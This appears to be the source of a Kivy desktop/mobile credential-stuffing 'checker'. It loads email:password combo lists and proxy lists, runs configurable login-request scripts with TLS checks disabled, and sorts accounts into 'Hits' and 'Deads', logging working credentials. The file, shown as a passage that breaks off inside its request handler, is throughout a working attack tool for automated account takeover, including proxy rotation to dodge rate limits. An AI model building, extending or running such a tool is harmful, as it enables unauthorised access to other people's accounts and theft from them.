# Standard imports
import json
import os
import re
import random
from queue import Queue
from threading import Thread
from urllib.parse import quote
import time
import urllib3
import threading
from requests.adapters import HTTPAdapter

# Third party imports
import kivy
from kivy.app import App
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard
from kivy.metrics import dp
from kivy.graphics import Color, Rectangle, Line
from kivy.config import Config
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.filechooser import FileChooserListView
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.dropdown import DropDown
from kivy.uix.image import Image
from kivy.uix.label import Label
from kivy.uix.popup import Popup
from kivy.uix.progressbar import ProgressBar
from kivy.uix.scrollview import ScrollView
from kivy.uix.spinner import Spinner
from kivy.uix.textinput import TextInput
from kivy.uix.screenmanager import ScreenManager, Screen
from retry_requests import retry
from requests import exceptions

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
kivy.require('2.2.0')
Config.set('graphics', 'resizable', False)

def extract_substring(data, first, last):
    """
    Extract a substring from data that is between two substrings: first and last.
    
    :param data: The main string from which the substring is to be extracted.
    :param first: The starting substring.
    :param last: The ending substring.
    :return: Extracted substring or None if not found.
    """
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

class BorderedButton(Button):
    """
    Custom button with a border and background color.
    """
    def __init__(self, border_color=(1, 1, 1, 1), bg_color=(0, 0, 0, 0), **kwargs):
        # Set the background color to transparent by default
        super(BorderedButton, self).__init__(**kwargs)
        self.border_color = border_color
        self.bg_color = bg_color
        self.update_graphics()

        self.bind(pos=self.update_graphics, size=self.update_graphics)
        
    def update_graphics(self, *args):
        # Redraw the background and border colors
        self.canvas.before.clear()
        with self.canvas.before:
            Color(*self.bg_color)
            self.rect = Rectangle(pos=self.pos, size=self.size)
            Color(*self.border_color)
            Line(rectangle=(self.x, self.y, self.width, self.height), width=dp(1))

    def on_press(self):
        # Change the button color on press
        super(BorderedButton, self).on_press()
        self.bg_color = (0.3, 0.3, 0.3, 1)  # Change Color on Press
        self.update_graphics()

    def on_release(self):
        # Change the button color on release
        super(BorderedButton, self).on_release()
        self.bg_color = (0, 0, 0, 1)  # Change Color on Release
        self.update_graphics()

class BorderedSpinner(Spinner, BorderedButton):
    """
    Custom spinner with a border and background color.
    """
    def __init__(self, **kwargs):
        # Set the background color to transparent by default
        super(BorderedSpinner, self).__init__(**kwargs)
        
    def on_press(self, *args):

        super(BorderedSpinner, self).on_press()

    def on_release(self, *args):
        super(BorderedSpinner, self).on_release()

    def _update_dropdown(self, *args):
        self._dropdown.clear_widgets()
        for value in self.values:
            # Use BorderedButton for each option
            item = BorderedButton(text=value, size_hint_y=None, height=self.height / 1.8, background_color=(0, 0, 0, 1))
            item.bind(on_release=lambda btn: self._dropdown.select(btn.text))
            self._dropdown.add_widget(item)

class ScreenManagement(ScreenManager):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.add_widget(MainScreen(name='main'))

class MainScreen(Screen):
    # Constants
    ICON_PATH = "src/logo.png"
    WATERMARK_PATH = "src/watermark.png"
    LOGS_TYPE = "Logs"
    HITS_TYPE = "Hits"
    DEADS_TYPE = "Deads"

    def __init__(self, **kwargs):
        # Initialize the screen
        super(MainScreen, self).__init__(**kwargs)

        self.combo, self.proxies = "", ""
        self.variables = {}
        self.responses = {}
        self.headers = {}
        self.cookies = {}
        self.response_codes = {}
        self.urls = {}
        self.progreso = 0
        self.dropdown_buttons = []
        self.is_stopping = False
        self.is_paused = False
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.start_n = 0
        self.timeout_n = 45
        
        self.layout = GridLayout(cols=1)


        # Add the State Label
        self.state_label = Label(text="State: Sleeping", size_hint=(0.3, 0.1), pos_hint={'right': 1, 'bottom': 1}, halign="right", valign="bottom", font_size=dp(20))
        self.layout.add_widget(self.state_label)

        # Add Progress Bar
        self.progress_bar = ProgressBar(max=100, value=0, size_hint=(1, 0.05))
        self.layout.add_widget(self.progress_bar)

        # Add Config Spinner
        self.options_spinner = BorderedSpinner(text='Select Config', values=('Bees', "Custom"), background_color=(0, 0, 0, 1))
        self.options_spinner.bind(text=self.on_options_spinner_selection)

        # Add Threads Input
        threads_label = Label(text="Threads:")
        self.threads_input = TextInput(input_filter="int", multiline=False)
        threads_layout = BoxLayout(orientation='horizontal', padding=dp(10), spacing=dp(5), size_hint=(1, 0.15))
        threads_layout.add_widget(threads_label)
        threads_layout.add_widget(self.threads_input)
        threads_layout.add_widget(self.options_spinner)
        self.layout.add_widget(threads_layout)

        # Buttons Configuration
        buttons_layout = BoxLayout(orientation='horizontal', padding=dp(15), spacing=dp(10), size_hint=(1, 0.16))
        self.load_button = BorderedButton(text="Combo", background_color=(0, 0, 0, 1))
        self.load_button.bind(on_press=self.load_combo)
        self.run_button = BorderedButton(text="Start", background_color=(0, 0, 0, 1))
        self.run_button.bind(on_press=self.run_file)
        self.proxies_button = BorderedButton(text="Proxies", background_color=(0, 0, 0, 1))
        self.proxies_button.bind(on_press=self.load_proxies)
        buttons_layout.add_widget(self.load_button)
        buttons_layout.add_widget(self.run_button)
        buttons_layout.add_widget(self.proxies_button)

        # Add Proxy Type Spinner
        self.proxy_spinner = BorderedSpinner(text='No Proxy', values=('No Proxy', 'HTTP', 'HTTPS', 'SOCKS4', 'SOCKS5'), background_color=(0, 0, 0, 1))
        self.proxy_spinner.bind(text=self.on_proxy_spinner_selection)

        # Disable proxy loading button by default
        self.proxies_button.disabled = True

        proxy_layout = BoxLayout(orientation='vertical')
        proxy_label = Label(text="Proxy Type:")
        proxy_layout.add_widget(proxy_label)
        proxy_layout.add_widget(self.proxy_spinner)
        buttons_layout.add_widget(proxy_layout)

        self.layout.add_widget(buttons_layout)

        # Results Configuration
        self.result_grid = GridLayout(cols=3, padding=dp(10))
        self.layout.add_widget(self.result_grid)
        
        def create_scrollable_label_with_clear_button(text, color):
            labels = []
            box_with_buttons = BoxLayout(orientation='vertical', size_hint_y=1)
            scroll_view = ScrollView(do_scroll_x=True, do_scroll_y=True, size_hint_y=1)
            content_box = BoxLayout(orientation='vertical', size_hint_y=None, size_hint_x=None)
            content_box.bind(minimum_height=content_box.setter('height'))
            content_box.bind(minimum_width=content_box.setter('width'))
            

            label = Label(text=text, font_size=dp(15), size_hint_y=None, size_hint_x=None, halign="left", valign="top", color=color)
            label.bind(texture_size=label.setter('size'))
            content_box.add_widget(label)
            labels.append(label)
            
            scroll_view.add_widget(content_box)
            box_with_buttons.add_widget(scroll_view)
            
            return box_with_buttons, labels, content_box
    
        # Create the results boxes and labels
        self.result_logs_box, self.result_logs_labels, self.logs_content_box = create_scrollable_label_with_clear_button("Logs:\n", (1, 1, 1, 1))
        self.result_hits_box, self.hits_labels, self.hits_content_box = create_scrollable_label_with_clear_button("Hits: 0\n", (0, 1, 0, 1))
        self.result_deads_box, self.deads_labels, self.deads_content_box = create_scrollable_label_with_clear_button("Deads: 0\n", (1, 0, 0, 1))

        def info_label(text):
            # Create a label with the given text
            info_label = Label(text=text, halign="left", valign="center", color=(1, 1, 1, 1))
            info_label.bind(texture_size=info_label.setter('size'))
            return info_label

        # Stats and Tools Configuration
        stats_tools_layout = BoxLayout(orientation='horizontal', size_hint=(1, 0.17), padding=dp(10), spacing=dp(5))

        # Stats
        self.cpm_label = info_label("CPM: 0")
        self.time_label = info_label("00:00:00")
        
        stats_layout = BoxLayout(orientation='horizontal', spacing=dp(5))
        stats_layout.add_widget(self.cpm_label)
        stats_layout.add_widget(self.time_label)
        stats_tools_layout.add_widget(stats_layout)
        
        # Tools Dropdown
        tools_button, tools_dropdown = self.create_dropdown_menu(None, None)
        stats_tools_layout.add_widget(tools_button)

        # Config Button (Popup)
        self.config_popup_button = BorderedButton(text="Configuration", size_hint=(0.5, 1), background_color=(0, 0, 0, 1))
        self.config_popup_button.bind(on_press=self.show_config_popup)
        stats_tools_layout.add_widget(self.config_popup_button)

        # Stats and Tools Set
        self.layout.add_widget(stats_tools_layout)

        self.result_grid.add_widget(self.result_logs_box)
        self.result_grid.add_widget(self.result_hits_box)
        self.result_grid.add_widget(self.result_deads_box)

        # Create and return the main layout
        main_layout = FloatLayout()

        # Add watermark image
        watermark = Image(source=self.WATERMARK_PATH, allow_stretch=True, keep_ratio=False, opacity=0.40, pos_hint={'center_x': 0.5, 'center_y': 0.45}, size_hint=(0.8, 0.8))
        main_layout.add_widget(watermark)

        # Create a secondary layout to contain the existing layout
        secondary_layout = FloatLayout(size_hint=(1, 1))
        secondary_layout.add_widget(self.layout)

        # Add the secondary layout to the main layout
        main_layout.add_widget(secondary_layout)
        self.add_widget(main_layout)
        return 
    
    def show_full_screen(self, text):
        """
        Show a fullscreen popup with the given text.
        """

        full_screen_layout = BoxLayout(orientation='vertical')
        full_screen_label = TextInput(text=text, readonly=True, multiline=True)
        close_button = Button(text="Close", size_hint=(1, 0.1))

        full_screen_layout.add_widget(full_screen_label)
        full_screen_layout.add_widget(close_button)

        self.full_screen_popup = Popup(title="View Content", content=full_screen_layout, size_hint=(0.9, 0.9))
        close_button.bind(on_press=self.full_screen_popup.dismiss)
        self.full_screen_popup.open()
        
    def schedule_update_labels(self, box, labels, text):
        Clock.schedule_once(lambda dt: self._update_labels(box, labels, text))

    def _update_labels(self, box, labels, text):
        self.add_text_to_labels(box, labels, text)

    def add_text_to_labels(self, content_box, labels, new_text):
        """
        Add the given text to the labels.
        :param content_box: The box containing the labels.
        :param labels: The labels to add the text to.
        :param new_text: The text to add.
        """

        # Get the last label and its text
        current_label = labels[-1]
        current_text = current_label.text + new_text
        lines = current_text.split('\n')

        # Set the color of the new text
        if "TOCHECK" in new_text: current_label.color = (1, 1, 0, 1)
        else: color = current_label.color
        
        # Only keep the last 100 lines
        remaining_lines = 100 - len(current_label.text.split('\n'))
        current_label.text = '\n'.join(lines[-remaining_lines:])
        lines = lines[:-remaining_lines]
        
        # Delete old labels when exceding 100 lines limit
        while len(labels) * 100 - len(lines) > 100:
            content_box.remove_widget(labels[0])
            labels.pop(0)
        
        # Add the remaining lines to new labels
        while lines:
            new_label = Label(text="", font_size=dp(15), size_hint_y=None, size_hint_x=None, halign="left", valign="top", color=color)
            new_label.bind(texture_size=new_label.setter('size'))
            new_label.text = '\n'.join(lines[:200])
            content_box.add_widget(new_label)
            labels.append(new_label)
            lines = lines[200:]

    def modify_line(self, labels, line_number, new_content):
        """
        Modify a specific line in the given labels.
        :param labels: Labels to modify.
        :param line_number: Line Number (0-indexed).
        :param new_content: Content to replace the line with.
        """
        total_lines = 0
        
        for label in labels:
            label_lines = label.text.split('\n')
            
            if total_lines + len(label_lines) > line_number:
                label_lines[line_number - total_lines] = new_content
                label.text = '\n'.join(label_lines)
                return
            
            total_lines += len(label_lines)

    def reset_labels_box(self, content_box, labels, initial_text="Logs:\n"):
        """
        Clean the given labels box and reset the text of the first label.
        """

        # Hold the first label and remove the rest
        first_label = labels[0]
        for label in labels[1:]:
            content_box.remove_widget(label)
        labels.clear()
        labels.append(first_label)
        
        # Reset the text of the first label
        first_label.text = initial_text

    def get_box_content(self, labels):
        """
        Return the full text of the given labels.
        """

        full_text = ""
        for label in labels:
            full_text += label.text
        return full_text

    def on_options_spinner_selection(self, instance, value):
        if value == "Custom":
            self.load_instructions(instance)

    def create_dropdown_menu(self, label, type_):
        """
        Create a dropdown menu with the given label and type.
        :param label: The label to be used in the dropdown.
        :param type_: The type to be used in the dropdown.
        """
        dropdown = DropDown()

        # Use secondary dropdowns to handle the options
        def create_button_action(current_text, current_label, current_type, current_dropdown):
            secondary_dropdown = self.create_secondary_dropdown(current_text)
            def button_action(instance):
                secondary_dropdown.open(instance)
            return button_action

        # Add all primary options to the main dropdown
        for text in ["Clean", "Copy", "FullScreen", "Save"]:
            btn = BorderedButton(text=text, size_hint_y=None, height=dp(40), background_color=(0, 0, 0, 1))
            btn.bind(on_release=create_button_action(text, label, type_, dropdown))
            dropdown.add_widget(btn)
            self.dropdown_buttons.append(btn)

        # The main button for the dropdown menu
        main_button = BorderedButton(text='Tools', size_hint=(0.5, 1), background_color=(0, 0, 0, 1))
        main_button.bind(on_release=dropdown.open)
        dropdown.bind(on_select=lambda instance, x: setattr(main_button, 'text', x))

        return main_button, dropdown

    def create_secondary_dropdown(self, primary_option):
        """
        Create a secondary dropdown menu with the given primary option.
        :param primary_option: The primary option to be used in the dropdown.
        """

        # Create the secondary dropdown
        dropdown = DropDown()

        def secondary_option_selected(instance):
            # Handle the selected option
            if primary_option == "Clean":
                if instance.text == "Hits":
                    content_box_hits = self.result_hits_box.children[0].children[0]
                    self.reset_labels_box(content_box_hits, self.hits_labels, "Hits: 0 \n")
                elif instance.text == "Deads":
                    content_box_deads = self.result_deads_box.children[0].children[0]
                    self.reset_labels_box(content_box_deads, self.deads_labels, "Deads: 0 \n")
                elif instance.text == "Logs":
                    content_box_logs = self.result_logs_box.children[0].children[0]
                    self.reset_labels_box(content_box_logs, self.result_logs_labels, "Logs:\n")
            
            elif primary_option == "Copy":
                if instance.text == "Hits":
                    Clipboard.copy(self.get_box_content(self.hits_labels))
                elif instance.text == "Deads":
                    Clipboard.copy(self.get_box_content(self.deads_labels))
                elif instance.text == "Logs":
                    Clipboard.copy(self.get_box_content(self.result_logs_labels))

            elif primary_option == "FullScreen":
                if instance.text == "Hits":
                    self.show_full_screen(self.get_box_content(self.hits_labels))
                elif instance.text == "Deads":
                    self.show_full_screen(self.get_box_content(self.deads_labels))
                elif instance.text == "Logs":
                    self.show_full_screen(self.get_box_content(self.result_logs_labels))

            elif primary_option == "Save":
                if instance.text == "Hits":
                    self.save_content(instance=self, type_="Hits")
                elif instance.text == "Deads":
                    self.save_content(instance=self, type_="Deads")
                elif instance.text == "Logs":
                    self.save_content(instance=self, type_="Logs")

            dropdown.dismiss()

        # Add all secondary options to the dropdown
        for option in ["Hits", "Deads", "Logs"]:
            btn = BorderedButton(text=option, size_hint_y=None, height=dp(40), background_color=(0, 0, 0, 1))
            btn.bind(on_release=secondary_option_selected)
            dropdown.add_widget(btn)

        return dropdown

    def dropdown_option_selected(self, option, label, type_):
        """
        Handle the selected dropdown option.
        :param text: The selected option.
        :param label: The label to be used in the dropdown.
        :param type_: The type to be used in the dropdown.
        """

        if option == "Clean":
            label.text = type_ + ":\n"
        elif option == "Copy":
            Clipboard.copy(label.text)
        elif option == "FullScreen":
            self.show_full_screen(label.text)
        elif option == "Save":
            self.save_content(instance=self, type_=type_)

    def on_proxy_spinner_selection(self, instance, value):
        """
        Handles the selection event of the proxy spinner.
        
        :param instance: The widget instance that triggered the event.
        :param value: The selected value from the spinner.
        """
        
        # Check if "No Proxy" is selected
        if value == "No Proxy":
            self.proxies = ""
            self.proxies_button.disabled = True
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\n[*] Proxies Disabled!")
        else:
            # Handle other proxy type selections
            self.proxies_button.disabled = False
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\n[*] Proxies Enabled!")

    def show_config_popup(self, instance):
        """
        Show a popup with the configuration options.
        """
        # Create the content of the popup
        content = BoxLayout(orientation='vertical', spacing=dp(5), padding=dp(10))

        # Create options for the configuration menu and add them to the content
        options_layout = GridLayout(cols=2, spacing=dp(5), size_hint_y=None)
        options_layout.bind(minimum_height=options_layout.setter('height'))

        options_layout.add_widget(Label(text="Start:", size_hint_y=None, height=dp(33), font_size=dp(15), color=(1, 1, 1, 1)))
        self.start_input = TextInput(multiline=False, size_hint_x=0.5, height=dp(33), font_size=dp(15), background_color=(1, 1, 1, 1), text=str(self.start_n), input_filter="int")
        options_layout.add_widget(self.start_input)
        
        options_layout.add_widget(Label(text="Requests Timeout:", size_hint_y=None, height=dp(33), font_size=dp(15), color=(1, 1, 1, 1)))
        self.timeout_input = TextInput(multiline=False, size_hint_x=0.5, height=dp(33), font_size=dp(15), background_color=(1, 1, 1, 1), text=str(self.timeout_n), input_filter="int")
        options_layout.add_widget(self.timeout_input)
        
        content.add_widget(options_layout)

        # Create the buttons for the popup
        buttons_layout = BoxLayout(orientation='horizontal', spacing=dp(5))
        close_button = BorderedButton(text="Save Changes", size_hint_y=None, height=dp(44), background_color=(0, 0, 0, 1))
        close_button.bind(on_press=lambda x: self.config_popup.dismiss())
        buttons_layout.add_widget(close_button)
        content.add_widget(buttons_layout)

        # Create and open the popup
        self.config_popup = Popup(title="Configuration", content=content, size_hint=(0.9, 0.9), on_dismiss=self.update_config)
        self.config_popup.open()

    def update_config(self, instance):
        """
        Update the configuration variables with the values from the popup.
        """
        self.start_n = int(self.start_input.text)
        self.timeout_n = int(self.timeout_input.text)

    def save_content(self, type_, instance):
        """
        Display a popup with a file chooser and a save button to save the specified content type.

        :param type_: The content type to be saved (e.g., Logs, Hits, Deads).
        :param instance: The button instance triggering this method.
        """

        # Get the home path
        home_path = os.path.expanduser("~")
        if ":" not in home_path: home_path = "/storage/emulated/0/"

        # Create the FileChooser and the save button
        content = BoxLayout(orientation='vertical', spacing=dp(5))
        file_chooser = FileChooserListView(path=home_path)
        save_button = Button(text="Save Here", size_hint_y=None, height=dp(44))
        
        # Bind the save button to save the content to the selected directory using partial
        save_button.bind(on_press=lambda x: self.save_file(file_chooser.path, type_))
        
        content.add_widget(file_chooser)
        content.add_widget(save_button)
        
        # Create and open the popup
        self.save_popup = Popup(title="Save Content", content=content, size_hint=(0.9, 0.9))
        self.save_popup.open()

    def save_file(self, path, type_):
        """
        Save the specified content type to a file in the given path.

        :param path: The directory path where the file should be saved.
        :param type_: The content type to be saved (e.g., Logs, Hits, Deads).
        """

        # Define a filename
        filename = f"{type_}.txt"
        
        # Save the content to the file
        with open(os.path.join(path, filename), 'w', encoding="utf-8", errors="ignore") as file:
            if type_ == self.LOGS_TYPE:
                file.write(self.get_box_content(self.result_logs_labels))
            elif type_ == self.HITS_TYPE:
                file.write(self.get_box_content(self.hits_labels))
            elif type_ == self.DEADS_TYPE:
                file.write(self.get_box_content(self.deads_labels))
        self.save_popup.dismiss()

    def _update_text_size(self, instance, size_value):
        instance.text_size = (size_value[0], None)

    def _update_text_height(self, instance, height_value):
        instance.text_size = (height_value, None)
        instance.height = instance.texture_size[1]

    def load_instructions(self, instance):
        """
        Display a file chooser popup to select and load instructions.
        
        :param instance: The button instance triggering this method.
        """

        # Get the home path
        home_path = os.path.expanduser("~")
        if ":" not in home_path: home_path = "/storage/emulated/0/"

        # Create the FileChooser and the load button
        file_chooser = FileChooserListView(path=home_path, filters=['*.txt'])
        self.choose_file_popup = Popup(title="Load Config", content=file_chooser, size_hint=(0.9, 0.9))

        file_chooser.bind(on_submit=self._load_selected_instructions)
        self.choose_file_popup.open()
        self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\n[*] Loading Config...")

    def run_custom_instructions(self, email, passwordO, proxyDict):
        """
        Processes the loaded instructions using the provided email, password, and proxy dictionary.
        
        :param email: The email to be processed.
        :param passwordO: The corresponding password.
        :param proxyDict: The proxy dictionary to be used in the requests.
        :return: Result message if any.
        """

        # Ensure instructions are loaded
        if not getattr(self, 'instructions', None):
            return "\n[*] You must load instructions first!"
        
        # Initialize the session and mount the adapter
        self.my_session = retry(retries=3)
        adapter = HTTPAdapter(pool_connections=1000, pool_maxsize=1000, max_retries=3)
        self.my_session.mount('http://', adapter)
        self.my_session.mount('https://', adapter)

        # Iterate through the instructions and process them
        for instruction in self.instructions:
            result = self.process_instruction(instruction.strip(), email, passwordO, proxyDict)
            if result == exceptions.ReadTimeout: return "\n[*] Read Timeout!"
            if result:
                return result
            
        return None

    def load_combo(self, instance):
        self._setup_file_chooser("Load Combo", self._load_selected_file)
        self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\n[*] Loading Combo...")

    def load_proxies(self, instance):
        self._setup_file_chooser("Load Proxies", self._load_selected_proxies)
        self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\n[*] Loading Proxies...")
            
    def _load_selected_file(self, instance, selected_file, *args):
        """Process the selected combo file."""
        try:
            with open(selected_file[0], 'r', encoding="utf-8", errors="ignore") as file:
                self.combo = file.read()
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Combo Loaded:\n{selected_file[0]}")
        except Exception as e:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Error loading combo: {e}")
        finally:
            self.choose_file_popup.dismiss()
        
    def _load_selected_proxies(self, instance, selected_file, *args):
        """Process the selected proxies file."""
        try:
            with open(selected_file[0], 'r', encoding="utf-8", errors="ignore") as file:
                self.proxies = file.read()
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Proxies Loaded:\n{selected_file[0]}")
        except Exception as e:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Error loading proxies: {e}")
        finally:
            self.choose_file_popup.dismiss()

    def _load_selected_instructions(self, instance, selected_file, *args):
        """Process the selected instructions file."""
        if type(selected_file) == str: selected_file = [selected_file]
        try:
            with open(selected_file[0], 'r', encoding="utf-8", errors="ignore") as file:
                self.instructions = file.read().split('\n')
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Config Loaded:\n{selected_file[0]}")
        except Exception as e:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Error loading config: {e}")
        finally:
            self.choose_file_popup.dismiss()

    def _setup_file_chooser(self, title, submit_callback):
        """
        Set up a file chooser with the given title and submit callback.

        :param title: Title for the popup.
        :param submit_callback: Callback function to handle the selected file.
        """

        # Get the home path
        home_path = os.path.expanduser("~")
        if ":" not in home_path:
            home_path = "/storage/emulated/0/"
        
        # Create the FileChooser and the load button
        file_chooser = FileChooserListView(path=home_path, filters=['*.txt'])
        self.choose_file_popup = Popup(title=title, content=file_chooser, size_hint=(0.7, 0.7))
        
        file_chooser.bind(on_submit=submit_callback)
        self.choose_file_popup.open()

    def parse_proxy(self, proxy_str, proxy_type):
        """
        Parse the given proxy string and return a dictionary with the proxy settings.
        :param proxy_str: The proxy string to parse.
        :param proxy_type: The proxy type to use.
        :return: Dictionary with the proxy settings.
        """

        proxy_dict = {}

        # Check for valid proxy types
        valid_proxy_types = ["http", "https", "socks4", "socks5", "socks4a", "socks5h"]
        if proxy_type not in valid_proxy_types:
            raise ValueError(f"Invalid proxy type provided: {proxy_type}. Supported types are: {', '.join(valid_proxy_types)}")

        # Parse rotative proxies with "@" format
        if "@" in proxy_str and (proxy_str.count(":") >= 2):
            user_pass, host_port = proxy_str.split("@")
            host, port = host_port.split(":")
            
            # Check if "-" is present and not a common split character for username:password
            if "-" in user_pass and ":" not in user_pass:
                username = user_pass.rsplit("-", 1)[0]
                password = user_pass.rsplit("-", 1)[1]
            else:
                username, password = user_pass.split(":")
            
            formatted_proxy = f"{proxy_type}://{username}:{password}@{host}:{port}"

        # Another format for rotative proxies without "@"
        elif proxy_str.count(":") == 3:
            split_values = proxy_str.split(":")
            host = split_values[0]
            port = split_values[1]
            
            # Construct user_pass from remaining split values
            user_pass = ":".join(split_values[2:])
            
            # Check if "-" is present and not a common split character for username:password
            if "-" in user_pass and ":" not in user_pass:
                username = user_pass.rsplit("-", 1)[0]
                password = user_pass.rsplit("-", 1)[1]
            else:
                username, password = user_pass.split(":")
            
            formatted_proxy = f"{proxy_type}://{username}:{password}@{host}:{port}"

        # Parse regular proxies with known scheme
        elif proxy_str.startswith(tuple(valid_proxy_types)):
            proxy_given_type, rest = proxy_str.split("://")
            formatted_proxy = proxy_str
            proxy_type = proxy_given_type

        # Parse proxies without a scheme but with port
        elif proxy_str.count(":") == 1:
            host, port = proxy_str.split(":")
            formatted_proxy = f"{proxy_type}://{host}:{port}"

        # Parse individual IPs without ports
        elif "." in proxy_str and ":" not in proxy_str:
            formatted_proxy = f"{proxy_type}://{proxy_str}"

        # If none of the above formats match, return None
        else:
            return None

        proxy_dict["http"] = formatted_proxy
        proxy_dict["https"] = formatted_proxy
        return proxy_dict

    def process_instruction(self, instruction, email, password, proxyDict):
        """
        Processes a given instruction using the provided email, password, and proxy dictionary.
        
        :param instruction: The instruction string to process.
        :param email: Email to be used in the instruction.
        :param password: Password to be used in the instruction.
        :param proxyDict: Proxy settings.
        :return: Processed result or error message.
        """

        self.email = email
        self.password = password
        self.proxyDict = proxyDict

        # Check if the line is a comment
        if instruction[0] == "#":
            return

        # Split instruction into its components
        components = instruction.split('|')
        params = {key: value for key, value in (part.split('=', 1) for part in components)}

        # Check if the instruction is valid
        if 'BLOCK' not in params:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nInvalid instruction: {instruction}")
            return

        # Direct to appropriate handlers based on block type
        block_type = params['BLOCK'].split('-', 1)[0]
        handler_name = f"handle_{block_type.lower()}"
        handler_method = getattr(self, handler_name, None)

        # Handle the instruction
        if handler_method:
            result = handler_method(params)
            if block_type == "REQUEST" and result == exceptions.ReadTimeout:
                return result
            if block_type == "RESULT" and result:
                return result
        else:
            return f"\nUnrecognized block type: {block_type}"

    def _replace_variables(self, input_string, encode=False):
        """
        Replace placeholders in the string with their actual values.
        
        :param input_string: The input string containing placeholders.
        :param encode: If True, encodes the replaced values.
        :return: String with placeholders replaced.
        """

        # Define the regular expression pattern for variables
        pattern = re.compile(r'<(.*?)>')
        matches = re.findall(pattern, input_string)
        
        # Replace the variables with their values
        for match in matches:
            variable_name = match.strip()

            if "REQUEST-" in variable_name:
                variable_value = ""
                if "text" in variable_name:
                        variable_value = str(self.responses.get(variable_name[:-5]))
                elif "status_code" in variable_name: 
                    variable_value = str(self.response_codes.get(variable_name[:-12]))
                elif "headers" in variable_name:
                    variable_value = str(self.headers.get(variable_name[:-8]))
                elif "cookies" in variable_name:
                    variable_value = str(self.cookies.get(variable_name[:-8]))
                elif "url" in variable_name:
                    variable_value = str(self.urls.get(variable_name[:-4]))
            elif variable_name == "EMAIL":
                variable_value = self.email
            elif variable_name == "PASSWORD":
                variable_value = self.password
            else:
                variable_value = str(self.variables.get(variable_name))
                
            if not variable_value:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n{variable_name} - Variable not found")
                return
            else:
                if encode:
                    variable_value = quote(variable_value)
                input_string = input_string.replace(f"<{match}>", variable_value)

        return input_string

    def handle_result(self, params):
        """
        Handles the RESULT block type in instructions.
        
        :param params: Dictionary of parameters extracted from the instruction.
        :return: Processed result or None.
        """

        # Get the result string and replace variables
        value_string = params.get('VALUE', '').strip()
        variable_content = self._replace_variables(params.get('VAR', '').strip())
        category = params.get('CATEGORY', '').strip()
        return_string = self._replace_variables(params.get('RETURN', '').strip())

        # Check if the variable exists
        if not variable_content:
            return
        
        # Check if the value string exists in the variable content
        if value_string in variable_content:
            response_string = return_string or value_string or variable_content
            return f"\nCREDENTIALS = {self.email}:{self.password} | RESPONSE = {response_string} | {category}"
        return None

    def handle_request(self, params):
        """
        Handles the REQUEST block type in instructions.

        :param params: Dictionary of parameters extracted from the instruction.
        """

        # Get the request parameters
        block = params.get('BLOCK')
        type_ = params.get('TYPE', 'GET').upper()
        url = params.get('URL')
        headers = params.get('HEADERS')
        content_data = params.get('CONTENT')
        is_redirect = params.get('REDIRECT', 'TRUE').upper()

        # Check if the URL is valid
        if not url:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\nURL not provided for the request")
            return
        
        # Replace variables in the URL string
        url=self._replace_variables(url)
        if url == None:
            return
        
        # Replace RND functions in the URL string
        url = self._random_string(url)
        
        # Replace LENGTH functions in the URL string
        url = self._length_string(url)

        # Convert the headers string to a dictionary
        headers_dict = {}
        if headers:
            headers = self._replace_variables(headers)
            headers = self._random_string(headers)
            headers = self._length_string(headers)
            if headers == None:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\nHeaders provided are invalid for the request")
                return
            headers = json.loads(headers)

        response = None
        
        # Set the timeout for the request
        try: self.timeout_n = int(self.timeout_input.text)
        except AttributeError: self.timeout_n = 45

        # Make the request
        if type_ == 'GET':
            try: response = self.my_session.get(url, headers=headers_dict, proxies=self.proxyDict, timeout=self.timeout_n, verify=False, allow_redirects=is_redirect == 'TRUE')
            except exceptions.ReadTimeout:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nTimeout Error in GET [{block}]")
                return exceptions.ReadTimeout
            except exceptions.ConnectionError:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nConnection Error in GET [{block}]")
                return
            except exceptions.InvalidURL:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nInvalid URL in GET [{block}]")
                return
            except exceptions.TooManyRedirects:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nToo Many Redirects in GET [{block}]")
                return

        elif type_ == 'POST':
            # if payload is json not must be encoded
            if content_data[0:1] == "{" or content_data[0:1] == "[":
                content_data=self._replace_variables(content_data, False)
                content_data=self._random_string(content_data)
                content_data=self._length_string(content_data)
            else:
                content_data=self._replace_variables(content_data, True)
                content_data=self._random_string(content_data)
                content_data=self._length_string(content_data)
            if content_data == None:
                return
            try: response = self.my_session.post(url, data=content_data, proxies=self.proxyDict, headers=headers, timeout=self.timeout_n, verify=False, allow_redirects=is_redirect == 'TRUE')
            except exceptions.ReadTimeout: 
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nTimeout Error in POST [{block}]")
